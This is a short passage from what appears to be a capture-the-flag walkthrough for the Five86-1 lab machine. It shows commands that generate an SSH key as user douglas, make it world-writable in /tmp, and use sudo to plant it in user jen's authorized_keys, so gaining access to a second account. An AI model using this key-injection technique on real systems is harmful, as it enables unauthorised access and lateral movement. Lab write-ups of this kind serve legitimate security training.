5.2 Generate an ssh key for our second user



a) On the Vicitim Machine run:

douglas@five86-1:/home$  ssh-keygen -b 2048


Output:


b) Copy this key to the target machine “/tmp” directory and change name to “authorized_keys”.

douglas@five86-1:/home$ cp /home/douglas/.ssh/id_rsa.pub /tmp/authorized_keys


c) Go to “tmp” directory and change “authorized_keys" file permission.

douglas@five86-1:/home$ cd /tmp
douglas@five86-1:/tmp$ chmod 777 authorized_keys


c) Copy “authorized_keys" file to “jen/.ssh” directory.

douglas@five86-1:/tmp$ sudo -u jen /bin/cp authorized_keys /home/jen/.ssh/
